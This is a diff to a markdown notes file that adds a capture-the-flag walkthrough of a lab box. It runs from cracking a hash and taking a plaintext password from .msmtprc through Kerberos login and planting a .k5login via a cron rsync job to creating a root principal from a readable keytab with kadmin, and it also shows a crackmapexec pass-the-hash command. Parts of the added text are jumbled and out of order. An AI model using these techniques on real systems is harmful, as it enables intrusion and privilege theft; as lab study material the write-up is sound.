@@ -53,7 +53,7 @@ make CONF=Release
 
 SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. By default, the key is only readable if you have **root** permissions.
 
-Invoking **`SSSDKCMExtractor` ** with the --database and --key parameters will parse the database and **decrypt the secrets**.
+Invoking \*\*`SSSDKCMExtractor` \*\* with the --database and --key parameters will parse the database and **decrypt the secrets**.
 
 ```bash
 git clone https://github.com/fireeye/SSSDKCMExtractor
@@ -110,6 +110,144 @@ Connect to the machine using the account and the hash with CME.
 $ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
 CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
 ```
+
+## Lateral Movement
+
+Having foothold in the system, we can start further enumerating the server. The OpenSMTPD configuration\
+file (/etc/smtpd/smtpd.conf) reveals that authentication is enabled for local TLS connections.
+
+The /etc/smtpd/creds file contains the password hash for j.nakazawa user. We can try to crack this
+
+hash using John The Ripper tool.
+
+Unfortunately is not possible to crack this hash. By enumerating home folders we spot a .msmtprc file.
+
+```
+echo -n
+'$6$EbpPCRMuO/Xwwv51$OVFV3eryJuJnk1vev7WX4JKgU6v8ND0zjXiI0CDMB0E4N6.bsp.2bpmNVUbYPRSIE
+5ex6dS92UbUAvcVdL.M/' > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+```
+msmtp is an SMTP client which can be used to send emails from mail user agents. It requires a configuration
+```
+
+file \~/.msmtprc with all required information in order to function. By checking the contents of this file\
+reveals a plaintext password.
+
+We try to connect to SSH service using the credentials: j.nakazawa / sJB}RM>6Z\~64\_ with no success. As
+
+there's Kerberos service running on the server, these credentials can be used to generate a Kerberos ticket\
+which can then be used to authenticate to the SSH service. We configure the file /etc/krb5.conf as below\
+in our machine.
+
+We add an additional entry to our hosts file.
+
+```
+[libdefaults]
+default_realm = REALCORP.HTB
+```
+
+```
+[realms]
+REALCORP.HTB = {
+kdc = srv01.realcorp.htb:
+}
+```
+
+```
+[domain_realm]
+.realcorp.htb = REALCORP.HTB
+realcorp.htb = REALCORP.HTB
+```
+
+```
+echo '10.10.10.224 srv01.realcorp.htb' >> /etc/hosts
+```
+
+To make sure our local time is synchronized with the time of the KDC, we run ntpdate.
+
+We issue the below command to get a global ticket for j.nakazawa user.
+
+```
+kinit j.nakazawa
+```
+
+Running klist command shows that the ticket is successfully created.
+
+```
+klist
+```
+
+It is now possible to SSH as user j.nakazawa using the Kerberos ticket.
+
+```
+ssh j.nakazawa@srv01.realcorp.htb
+```
+
+User flag can be found in /home/j.nakazawa/user.txt.
+
+```
+ntpdate 10 .10.10.
+```
+
+## Lateral Movement
+
+Enumerating the host we observe an entry in crontab.
+
+We review the contents of the log\_backup.sh script.
+
+This script copies all files from /var/log/squid to /home/admin folder and creates an archive from log
+
+files. It then removes log files from the /home/admin folder. User j.nakazawa is part of squid group and\
+can write to this folder. This gives us the ability to write arbitrary files to /home/admin folder.
+
+According to the MIT Kerberos documentation, .k5login files can be used to grant other users (identified
+
+by Kerberos principals) access to an account without the need of a password. Having already obtained a\
+Kerberos ticket for the j.nakazawa@REALCORP.HTB principal, we can exploit the arbitrary file write
+
+vulnerability to write a .k5login file to /home/admin and obtain access as the admin user.
+
+We issue the below command to write .k5login file to /var/log/squid folder
+
+```
+#!/bin/bash
+```
+
+```
+/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
+cd /home/admin
+/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
+/usr/bin/rm -f access.log cache.log
+```
+
+```
+echo "j.nakazawa@REALCORP.HTB" > /var/log/squid/.k5login
+```
+
+After a minute we can login to SSH as admin user.
+
+## Privilege Escalation
+
+By further enumerating the system, we find that the /etc/krb5.keytab file is owned (and readable) by the\
+admin group.
+
+We list the principals in the keytab file issuing the below command.
+
+The kadmin/admin@REALCORP.HTB principal is included in the keytab. This allows us to run kadmin with\
+admin privileges and create the root@REALCORP.HTB principal.
+
+```
+klist -kt /etc/krb5.keytab
+```
+
+```
+kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.htb -q "add_principal -pw test root@REALCORP.htb"
+```
+
+We switch to root user using ksu utility. We provide test when prompted for the password.
 
 ## References
 
